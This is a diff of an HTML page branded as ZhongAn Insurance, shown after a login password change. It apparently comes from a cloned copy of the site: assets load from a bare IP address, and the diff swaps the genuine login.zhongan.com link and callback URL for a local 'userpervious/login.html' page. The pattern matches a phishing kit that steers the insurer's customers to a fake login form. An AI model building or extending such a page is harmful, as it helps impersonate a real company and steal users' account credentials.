@@ -11,23 +11,24 @@
 	<meta name="keywords" content="会员登录，众安保险，互联网保险，网上支付，保单查询，在线理赔，让保险有温度">
     <meta name="description" content="众安保险是国内首家也是唯一一家互联网保险公司，个性化定制风险解决方案，全方位采用互联网先进科技，追求流畅、贴心、温暖的用户体验。">
     <link type="image/x-icon" rel="shortcut icon" href="https://static.zhongan.com/website/online/assets/images/favicon.ico">
-    <link href="http://47.93.221.88/userpervious/css/common.css" rel="stylesheet">
-    <link href="http://47.93.221.88/userpervious/css/identity.css" rel="stylesheet">
+    <link href="http://47.93.221.88/previous/userpervious/css/common.css" rel="stylesheet">
+    <link href="http://47.93.221.88/previous/userpervious/css/identity.css" rel="stylesheet">
 </head>
 
 <body class="identity-page">
     <div class="wrapper" style="margin-top: 150px; display: block;">
         <div class="overlay">
 
-        <div class="za-rect-box"><div class="za-top"> <a class="login-icon" href="https://www.zhongan.com/"></a> <span class="title">修改登录密码</span></div><div class="bg-icon"></div><div class="success">修改登录密码成功，<a href="http://login.zhongan.com/passport/login.htm?sourceApp=1&amp;target=https%3A%2F%2Fwww.zhongan.com%2Fopen%2Fmember%2FloginJump%3Flogincallback%3D%2Faccount%2FmyAccount">请登录</a></div></div></div>
+        <div class="za-rect-box"><div class="za-top"> <a class="login-icon" href="https://www.zhongan.com/"></a> <span class="title">修改登录密码</span></div><div class="bg-icon"></div><div class="success">修改登录密码成功，<a href="../userpervious/login.html">请登录</a></div></div></div>
         <div class="za-m-copyright  g-doc-w g-mar-auto f-oh">
             <a target="_blank" href="http://www.miibeian.gov.cn/">沪ICP备13041135号-1</a> CopyRight 众安保险 allRight Reserved
         </div>
     </div>
-    <script src="http://47.93.221.88/userpervious/js/jquery.min.js"></script>
+    <script src="http://47.93.221.88/previous/userpervious/js/jquery.min.js"></script>
     <!--<script src="js/success.js"></script>-->
     <script>
-	var callbackUrl = "http://login.zhongan.com:80/passport/login.htm?sourceApp=1&amp;target=https%3A%2F%2Fwww.zhongan.com%2Fopen%2Fmember%2FloginJump%3Flogincallback%3D%2Faccount%2FmyAccount";
+	/*var callbackUrl = "http://login.zhongan.com:80/passport/login.htm?sourceApp=1&amp;target=https%3A%2F%2Fwww.zhongan.com%2Fopen%2Fmember%2FloginJump%3Flogincallback%3D%2Faccount%2FmyAccount";*/
+    var callbackUrl = "/userpervious/login.html";
     jsonData = {
         name: "修改登录密码",
         middleIcon: "<div class='bg-icon'></div>",
